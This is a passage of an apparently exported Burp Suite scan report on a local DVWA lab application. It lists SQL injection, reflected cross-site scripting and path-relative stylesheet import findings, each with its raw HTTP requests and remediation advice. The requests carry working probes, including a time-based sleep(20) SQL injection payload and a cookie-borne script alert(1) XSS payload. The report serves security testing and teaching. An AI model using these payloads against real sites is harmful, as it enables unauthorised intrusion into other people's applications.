<div class="rr_div"><span>GET /dvwa/vulnerabilities/sqli/?id=818102<span class="HIGHLIGHT">'</span>&amp;Submit=Submit HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=7oma6jkbb8s8uivt96l72d8515<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/sqli/<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:33:07 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Thu, 19 Nov 1981 08:52:00 GMT<br>Cache-Control: no-store, no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 616<br>Connection: close<br>Content-Type: text/html; charset=UTF-8<br><br>&lt;br /&gt;<br>&lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught mysqli_sql_exception: <span class="HIGHLIGHT">You have an error in your SQL syntax</span>; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''818102''' at line 1 in C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php:11<br>Stack trace:<br>#0 <br><b>...[SNIP]...</b><br></span></div>
<h2>Request 3</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/sqli/?id=818102<span class="HIGHLIGHT">''</span>&amp;Submit=Submit HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=7oma6jkbb8s8uivt96l72d8515<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/sqli/<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 3</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:33:07 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4046<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 4</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/sqli/?id=818102<span class="HIGHLIGHT">'%2b(select*from(select(sleep(20)))a)%2b'</span>&amp;Submit=Submit HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=7oma6jkbb8s8uivt96l72d8515<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/sqli/<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 4</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:33:07 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4046<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="25.2">25.2.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00200300_crosssitescriptingreflected">Cross-site scripting (reflected)</a></span>
<br><a class="PREVNEXT" href="#25.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#25.3">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_medium_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Medium</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/sqli/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>security</b> cookie is copied into the value of an HTML tag attribute which is encapsulated in single quotation marks. The payload <b>gcmb2'&gt;&lt;script&gt;alert(1)&lt;/script&gt;lo6vy</b> was submitted in the security cookie. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>Because the user data that is copied into the response is submitted within a cookie, the application's behavior is not trivial to exploit in an attack against another user. Typically, you will need to find a means of setting an arbitrary cookie value in the victim's browser in order to exploit the vulnerability. Applications often contain "cookie-forcing" conditions which make this possible, and such a condition in any related domain or subdomain can potentially be used for this purpose. Nonetheless, this limitation somewhat mitigates the impact of the vulnerability.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>
<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>
<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>
<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>In most situations where user-controllable data is copied into application responses, cross-site scripting 
  attacks can be prevented using two layers of defenses:</p>
<ul>
  <li>Input should be validated as strictly as possible on arrival, given the kind of content that 
it is expected to contain. For example, personal names should consist of alphabetical 
and a small range of typographical characters, and be relatively short; a year of birth 
should consist of exactly four numerals; email addresses should match a well-defined 
regular expression. Input which fails the validation should be rejected, not sanitized.</li>
<li>User input should be HTML-encoded at any point where it is copied into 
application responses. All HTML metacharacters, including &lt; &gt; " ' and =, should be 
replaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>
<p>In cases where the application's functionality allows users to author content using 
  a restricted subset of HTML tags and attributes (for example, blog comments which 
  allow limited formatting and linking), it is necessary to parse the supplied HTML to 
  validate that it does not use any dangerous syntax; this is a non-trivial task.</p></span>
<h2>References</h2>
<span class="TEXT"><ul>
	<li><a href="https://portswigger.net/web-security/cross-site-scripting">Web Security Academy: Cross-site scripting</a></li>
	<li><a href="https://portswigger.net/web-security/cross-site-scripting/reflected">Web Security Academy: Reflected cross-site scripting</a></li>
	<li><a href="https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html">Using Burp to Find XSS issues</a></li>
</ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/159.html">CWE-159: Failure to Sanitize Special Element</a></li>
    <li><a href="https://capec.mitre.org/data/definitions/591.html">CAPEC-591: Reflected XSS</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/sqli/ HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low<span class="HIGHLIGHT">gcmb2'%3e%3cscript%3ealert(1)%3c%2fscript%3elo6vy</span>; PHPSESSID=mqik8sd2q28jjk0an2cs29dncv<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:37:27 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Set-Cookie: PHPSESSID=mqik8sd2q28jjk0an2cs29dncv; path=/<br>Set-Cookie: security=low<br>Content-Length: 4212<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v<br><b>...[SNIP]...</b><br>&lt;input type="button" value="View Help" class="popup_button" id='help_button' data-help-url='../../vulnerabilities/view_help.php?id=sqli&amp;security=low<span class="HIGHLIGHT">gcmb2'&gt;&lt;script&gt;alert(1)&lt;/script&gt;lo6vy</span>&amp;locale=en' )"&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="25.3">25.3.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00200328_pathrelativestylesheetimport">Path-relative style sheet import</a></span>
<br><a class="PREVNEXT" href="#25.2">Previous</a>
&nbsp;<a class="PREVNEXT" href="#25.4">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_firm_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Firm</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/sqli/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>
<ol>
<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at "/original-path/file.php" might import "styles/main.css").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, "/original-path/file.php/extra-junk/"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>
<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL "/original-path/file.php/extra-junk/styles/main.css"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>
<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>
<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>
<ul>
  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>
<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>
<ul><li>Setting the HTTP response header "X-Frame-Options: deny" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. "&lt;!doctype html&gt;") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>
<li>Setting the HTTP response header "X-Content-Type-Options: nosniff" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul></span>
<h2>References</h2>
<span class="TEXT"><ul><li><a href="https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/154.html">CAPEC-154: Resource Location Spoofing</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/468.html">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/sqli/?id=438523&amp;Submit=Submit HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=d7hd3skcob66fgv4pb7jq8qstg<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/sqli/?id=856690&amp;Submit=Submit<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:31:08 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4046<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v<br><b>...[SNIP]...</b><br>&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="../../favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 2</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/sqli/<span class="HIGHLIGHT">index.php/x8deut/pkarkz/uc5rj6/</span>?id=438523&amp;Submit=Submit HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=d7hd3skcob66fgv4pb7jq8qstg<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/sqli/?id=856690&amp;Submit=Submit<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:35:18 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4046<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v<br><b>...[SNIP]...</b><br>&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="../../favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 3</h2>
<div class="rr_div"><span>GET <span class="HIGHLIGHT">/dvwa/vulnerabilities/sqli/index.php/x8deut/dvwa/css/main.css</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=d7hd3skcob66fgv4pb7jq8qstg<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/sqli/?id=856690&amp;Submit=Submit<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 3</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:35:18 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4046<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="25.4">25.4.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00400c00_inputreturnedinresponsereflected">Input returned in response (reflected)</a></span>
<br><a class="PREVNEXT" href="#25.3">Previous</a>
&nbsp;<a class="PREVNEXT" href="#26.1">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/sqli/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>security</b> cookie is copied into the application's response.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/sqli/ HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low<span class="HIGHLIGHT">y8s9h0ceix</span>; PHPSESSID=mqik8sd2q28jjk0an2cs29dncv<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:37:26 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Set-Cookie: PHPSESSID=mqik8sd2q28jjk0an2cs29dncv; path=/<br>Set-Cookie: security=low<br>Content-Length: 4158<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v<br><b>...[SNIP]...</b><br>&lt;input type="button" value="View Help" class="popup_button" id='help_button' data-help-url='../../vulnerabilities/view_help.php?id=sqli&amp;security=low<span class="HIGHLIGHT">y8s9h0ceix</span>&amp;locale=en' )"&gt; &lt;input type="button" value="View Source" class="popup_button" id='source_button' data-source-url='../../vulnerabilities/view_source.php?id=sqli&amp;security=low<span class="HIGHLIGHT">y8s9h0ceix</span>' )"&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH0" id="26">26.&nbsp;http://localhost:7878/dvwa/vulnerabilities/sqli_blind/</span>
<br><a class="PREVNEXT" href="#25">Previous</a>
&nbsp;<a class="PREVNEXT" href="#27">Next</a>
<br>
<span class="BODH1" id="26.1">26.1.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00100200_sqlinjection">SQL injection</a></span>
<br><a class="PREVNEXT" href="#25.4">Previous</a>
&nbsp;<a class="PREVNEXT" href="#26.2">Next</a>
<br>
<br><span class="TEXT">There are 2 instances of this issue:
<ul>
<li><a href="#26.1.1">/dvwa/vulnerabilities/sqli_blind/ [id parameter]</a></li>
<li><a href="#26.1.2">/dvwa/vulnerabilities/sqli_blind/ [id parameter]</a></li>
</ul></span>
<h2>Issue background</h2>
<span class="TEXT"><p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p></span>
<h2>Remediation background</h2>
<span class="TEXT"><p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
